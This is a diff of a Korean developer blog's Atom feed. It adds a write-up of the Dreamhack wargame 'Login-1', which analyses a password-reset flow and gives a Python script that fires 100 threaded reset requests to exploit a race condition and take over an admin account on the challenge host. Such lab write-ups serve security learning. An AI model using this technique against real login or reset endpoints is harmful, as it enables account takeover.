@@ -1,4 +1,152 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-04-07T17:54:42+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">이준형의 성장일기</title><subtitle>With Developer</subtitle><author><name>Lee Jun Hyeong</name></author><entry><title type="html">[Dreamhack] Login-1 풀이</title><link href="http://localhost:4000/dreamhack/Dreamhack-login-1/" rel="alternate" type="text/html" title="[Dreamhack] Login-1 풀이" /><published>2022-04-06T00:00:00+09:00</published><updated>2022-04-06T00:00:00+09:00</updated><id>http://localhost:4000/dreamhack/Dreamhack-login-1</id><content type="html" xml:base="http://localhost:4000/dreamhack/Dreamhack-login-1/"><![CDATA[]]></content><author><name>Lee Jun Hyeong</name></author><category term="Dreamhack" /><category term="Dreamhack" /><category term="wargame" /><category term="WebHacking" /><summary type="html"><![CDATA[Dreamhack Login-1 풀이]]></summary></entry><entry><title type="html">[Minimal mistakes] Meta 데이터 변경</title><link href="http://localhost:4000/blog/Blog-update-meta/" rel="alternate" type="text/html" title="[Minimal mistakes] Meta 데이터 변경" /><published>2022-03-24T00:00:00+09:00</published><updated>2022-03-24T00:00:00+09:00</updated><id>http://localhost:4000/blog/Blog-update-meta</id><content type="html" xml:base="http://localhost:4000/blog/Blog-update-meta/"><![CDATA[<h2 id="page__meta-수정">Page__meta 수정</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-04-07T19:59:55+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">이준형의 성장일기</title><subtitle>With Developer</subtitle><author><name>Lee Jun Hyeong</name></author><entry><title type="html">[Dreamhack] Login-1 풀이</title><link href="http://localhost:4000/dreamhack/Dreamhack-login-1/" rel="alternate" type="text/html" title="[Dreamhack] Login-1 풀이" /><published>2022-04-06T00:00:00+09:00</published><updated>2022-04-06T00:00:00+09:00</updated><id>http://localhost:4000/dreamhack/Dreamhack-login-1</id><content type="html" xml:base="http://localhost:4000/dreamhack/Dreamhack-login-1/"><![CDATA[<h2 id="문제-정보">문제 정보</h2>
+<div class="notice--primary">
+  <p>python으로 작성된 로그인 기능을 가진 서비스입니다.</p>
+
+  <p>“admin” 권한을 가진 사용자로 로그인하여 플래그를 획득하세요.</p>
+</div>
+
+<h2 id="문제-힌트">문제 힌트</h2>
+<div class="notice--primary">
+  <p>BackupCode<br />
+Race Condition Attack</p>
+</div>
+
+<h2 id="문제-풀이">문제 풀이</h2>
+<div class="notice--primary">
+
+  <h4 class="text-right" id="section"><code class="language-plaintext highlighter-rouge">메인 페이지</code></h4>
+  <p><img src="/assets/images/2022-04-06-Dreamhack-login-1/main.png" alt="ex_screenshot" /></p>
+
+  <h4 class="text-right" id="section-1"><code class="language-plaintext highlighter-rouge">로그인</code></h4>
+  <p><img src="/assets/images/2022-04-06-Dreamhack-login-1/login.png" alt="ex_screenshot" /></p>
+
+  <h4 class="text-right" id="section-2"><code class="language-plaintext highlighter-rouge">회원가입</code></h4>
+  <p><img src="/assets/images/2022-04-06-Dreamhack-login-1/register.png" alt="ex_screenshot" /></p>
+
+  <h4 class="text-right" id="section-3"><code class="language-plaintext highlighter-rouge">비밀번호 찾기</code></h4>
+  <p><img src="/assets/images/2022-04-06-Dreamhack-login-1/forget_password.png" alt="ex_screenshot" />
+특이하게 비밀번호를 찾을 때 BackupCode를 사용한다.</p>
+
+  <h4 class="text-right" id="section-4"><code class="language-plaintext highlighter-rouge">회원가입 완료</code></h4>
+  <p><img src="/assets/images/2022-04-06-Dreamhack-login-1/register_backupcode.png" alt="ex_screenshot" />
+회원가입에 성공하면 BackupCode가 생성된다.</p>
+
+  <h4 class="text-right" id="backupcode-"><code class="language-plaintext highlighter-rouge">BackupCode 함수</code></h4>
+  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">makeBackupcode</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">random</span><span class="p">.</span><span class="n">randrange</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+</code></pre></div>  </div>
+  <p>문제 파일을 다운로드 받아 해당 코드를 살펴보면
+makeBackupcode 함수가 있는데, randrange함수를 통해 100까지의 값을 랜덤으로 리턴해준다.</p>
+
+  <h4 class="text-right" id="section-5"><code class="language-plaintext highlighter-rouge">로그인 후</code></h4>
+  <p><img src="/assets/images/2022-04-06-Dreamhack-login-1/test_login.png" alt="ex_screenshot" />
+로그인을 시도하면 계정 정보가 출력된다.<br />
+현재 test계정으로 로그인을 한 결과 Level이 guest이다.</p>
+
+  <h4 class="text-right" id="section-6"><code class="language-plaintext highlighter-rouge">계정 정보</code></h4>
+  <p><img src="/assets/images/2022-04-06-Dreamhack-login-1/user_info.png" alt="ex_screenshot" />
+로그인 후 상단에 출력되는 계정 정보를 클릭하면 <code class="language-plaintext highlighter-rouge">/user/17</code> 경로의 상세보기 페이지로 넘어간다.<br />
+상세보기에서는 UserID, UserName, UserLevel이 출력된다.<br />
+UserLevel이 0이라면 guest, UserLevel이 1이라면 admin으로 추측된다.</p>
+
+  <h4 class="text-right" id="admin--"><code class="language-plaintext highlighter-rouge">Admin 계정 정보</code></h4>
+  <p><img src="/assets/images/2022-04-06-Dreamhack-login-1/Apple_info.png" alt="ex_screenshot" />
+<code class="language-plaintext highlighter-rouge">/user/1</code> 경로에 접속해보니 Admin 계정으로 추측되는 Apple 계정이 출력되었다.<br />
+해당 방법으로 1~16의 값을 입력해보니 Apple 이외에도 7개의 Admin 계정을 더 확인할 수 있다.<br /></p>
+
+  <h4 class="text-right" id="section-7"><code class="language-plaintext highlighter-rouge">관리자 계정 탈취</code></h4>
+  <p><img src="/assets/images/2022-04-06-Dreamhack-login-1/Apple_reset_password.png" alt="ex_screenshot" />
+Apple Admin 계정을 탈취하기 위해 BackupCode에 100까지의 아무 값을 입력했다.</p>
+
+  <h4 class="text-right" id="section-8"><code class="language-plaintext highlighter-rouge">관리자 계정 탈취2</code></h4>
+  <p><img src="/assets/images/2022-04-06-Dreamhack-login-1/reset_password_fail.png" alt="ex_screenshot" /><br />
+계정의 비밀번호 찾기 기회는 총 5번으로 확인되었다.
+막무가내로 아무 값을 넣었다간 계정이 잠긴다.</p>
+
+  <h4 class="text-right" id="section-9"><code class="language-plaintext highlighter-rouge">비밀번호 찾기 코드 확인</code></h4>
+  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="n">user</span><span class="p">:</span>
+<span class="c1"># security for brute force Attack.
+</span><span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">user</span><span class="p">[</span><span class="s">'resetCount'</span><span class="p">]</span> <span class="o">==</span> <span class="n">MAXRESETCOUNT</span><span class="p">:</span>
+    <span class="k">return</span> <span class="s">"&lt;script&gt;alert('reset Count Exceed.');history.back(-1);&lt;/script&gt;"</span>
+        
+    <span class="k">if</span> <span class="n">user</span><span class="p">[</span><span class="s">'backupCode'</span><span class="p">]</span> <span class="o">==</span> <span class="n">backupCode</span><span class="p">:</span>
+        <span class="n">newbackupCode</span> <span class="o">=</span> <span class="n">makeBackupcode</span><span class="p">()</span>
+        <span class="n">updateSQL</span> <span class="o">=</span> <span class="s">"UPDATE user set pw = ?, backupCode = ?, resetCount = 0 where idx = ?"</span>
+        <span class="n">cur</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">updateSQL</span><span class="p">,</span> <span class="p">(</span><span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">newpassword</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="n">newbackupCode</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">user</span><span class="p">[</span><span class="s">'idx'</span><span class="p">])))</span>
+        <span class="n">msg</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"&lt;b&gt;Password Change Success.&lt;/b&gt;&lt;br/&gt;New BackupCode : </span><span class="si">{</span><span class="n">newbackupCode</span><span class="si">}</span><span class="s">"</span>
+
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">updateSQL</span> <span class="o">=</span> <span class="s">"UPDATE user set resetCount = resetCount+1 where idx = ?"</span>
+        <span class="n">cur</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">updateSQL</span><span class="p">,</span> <span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">user</span><span class="p">[</span><span class="s">'idx'</span><span class="p">])))</span>
+        <span class="n">msg</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"Wrong BackupCode !&lt;br/&gt;&lt;b&gt;Left Count : &lt;/b&gt; </span><span class="si">{</span><span class="p">(</span><span class="n">MAXRESETCOUNT</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">-</span><span class="n">user</span><span class="p">[</span><span class="s">'resetCount'</span><span class="p">]</span><span class="si">}</span><span class="s">"</span>
+            
+    <span class="n">conn</span><span class="p">.</span><span class="n">commit</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"index.html"</span><span class="p">,</span> <span class="n">msg</span><span class="o">=</span><span class="n">msg</span><span class="p">)</span>
+
+<span class="k">return</span> <span class="s">"&lt;script&gt;alert('User Not Found.');history.back(-1);&lt;/script&gt;"</span><span class="p">;</span>
+
+</code></pre></div>  </div>
+  <ol>
+    <li>
+      <p><code class="language-plaintext highlighter-rouge">if user:</code><br />
+user 입력값이 유효하다면 <code class="language-plaintext highlighter-rouge">time.sleep(1)</code>를 통해 1초를 지연시킨다.</p>
+    </li>
+    <li>
+      <p><code class="language-plaintext highlighter-rouge">user['resetCount'] == MAXRESETCOUNT:</code><br />
+MAXRESETCOUNT값은 위의 과정에서 5인것을 확인했다.<br />
+resetCount값이 5라면 비밀번호 찾기에 제한이 생긴다.</p>
+    </li>
+    <li>
+      <p><code class="language-plaintext highlighter-rouge">if user['backupCode'] == backupCode:</code><br />
+BackupCode가 일치하면 makeBackupcode 함수를 호출해서 1~100까지 랜덤한 숫자의 백업코드를 만들고 패스워드를 변경한다.</p>
+    </li>
+    <li>
+      <p><code class="language-plaintext highlighter-rouge">else:</code><br />
+BackupCode가 일치하지 않으면 resetcount를 1 증가시킨다.</p>
+    </li>
+  </ol>
+
+  <p>코드를 분석한 결과 1초 내에 요청이 여러번 들어오면 레이스 컨디션 취약점이 발생하게 된다.<br />
+Burp Suite를 사용해서 문제를 취약점을 발생시키려고 했으나, <br />
+Burp Suite Community Edition 버전은 Intruder 기능을 사용할때 속도 제한이 걸려있다..<br />
+Professional 버전은 속도 제한이 없지만 지금은 Professional 버전이 없기떄문에<br />
+구글링을 통해 Python Script Attack을 시도했다.</p>
+
+  <h4 class="text-right" id="attack"><code class="language-plaintext highlighter-rouge">Attack</code></h4>
+  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">threading</span><span class="p">,</span> <span class="n">requests</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">"http://host1.dreamhack.games:19488/forgot_password"</span>
+
+<span class="k">def</span> <span class="nf">forgot</span><span class="p">(</span><span class="n">backupCode</span><span class="p">):</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"userid"</span><span class="p">:</span> <span class="s">"Apple"</span><span class="p">,</span> <span class="s">"newpassword"</span><span class="p">:</span> <span class="s">"1234"</span><span class="p">,</span> <span class="s">"backupCode"</span><span class="p">:</span> <span class="n">backupCode</span><span class="p">}</span>
+    <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Backupcode: </span><span class="si">{</span><span class="n">backupCode</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">threads</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"Attack Start"</span><span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
+        <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">forgot</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+        <span class="n">t</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
+        <span class="n">threads</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">thread</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
+        <span class="n">thread</span><span class="p">.</span><span class="n">join</span><span class="p">()</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s">"Attack Finish"</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"New Password: 1234"</span><span class="p">)</span>
+</code></pre></div>  </div>
+  <p><img src="/assets/images/2022-04-06-Dreamhack-login-1/attack_result.png" alt="ex_screenshot" /><br />
+공격이 끝났기 때문에 Apple 계정의 패스워드는 1234로 변경되었을것이다.</p>
+
+  <h4 class="text-right" id="section-10"><code class="language-plaintext highlighter-rouge">끝</code></h4>
+  <p><img src="/assets/images/2022-04-06-Dreamhack-login-1/Apple_login_success.png" alt="ex_screenshot" /><br />
+<img src="/assets/images/2022-04-06-Dreamhack-login-1/flag.png" alt="ex_screenshot" /><br />
+Apple/1234 계정의 접속에 성공해서 Flag를 얻었다.</p>
+
+</div>]]></content><author><name>Lee Jun Hyeong</name></author><category term="Dreamhack" /><category term="Dreamhack" /><category term="wargame" /><category term="WebHacking" /><summary type="html"><![CDATA[Dreamhack Login-1 풀이]]></summary></entry><entry><title type="html">[Minimal mistakes] Meta 데이터 변경</title><link href="http://localhost:4000/blog/Blog-update-meta/" rel="alternate" type="text/html" title="[Minimal mistakes] Meta 데이터 변경" /><published>2022-03-24T00:00:00+09:00</published><updated>2022-03-24T00:00:00+09:00</updated><id>http://localhost:4000/blog/Blog-update-meta</id><content type="html" xml:base="http://localhost:4000/blog/Blog-update-meta/"><![CDATA[<h2 id="page__meta-수정">Page__meta 수정</h2>
 
 <p>Page__meta 데이터중 출력되는 read_time값을 date값으로 변경했습니다.</p>
 
